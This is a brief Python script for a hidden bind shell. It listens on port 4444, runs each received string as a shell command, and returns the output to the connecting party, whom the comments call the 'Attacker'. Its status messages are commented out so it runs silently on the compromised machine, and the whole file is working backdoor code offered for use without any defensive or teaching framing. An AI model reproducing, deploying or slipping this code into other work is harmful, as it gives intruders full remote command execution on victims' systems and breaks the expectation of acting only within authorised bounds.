import socket
import subprocess
import threading

# SERVER SCRIPT but invisible



def cmdhandler(cmd, conn):
    res = subprocess.run(cmd, text=True, capture_output=True, shell=True)
    out = res.stdout + res.stderr
    if not out.strip():
        out = "[!] Cmd executed but empty stdout/stderr."
    conn.sendall(out.encode())
    




HOST = "0.0.0.0" # Add the client's ip here (Attacker)
PORT = 4444 # Add the client's port that its listening on (Attacker)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST,PORT))
    s.listen()
  #print(f"[-]Listening on {HOST}:{PORT}..")
    conn, addr = s.accept()
    with conn:

        #print(f"[+] Connected to {addr}")
        while True:
            try:
                data = conn.recv(1024)
                d = data.decode()
                if not data:
                    #print(f"Disconnected from {HOST}.")
                    break
                cmdhandler(d, conn)
            except Exception as e:
                if e == KeyboardInterrupt:
                    exit()
                else:
                    #print(f"Error:\n{e}.")
                    exit()
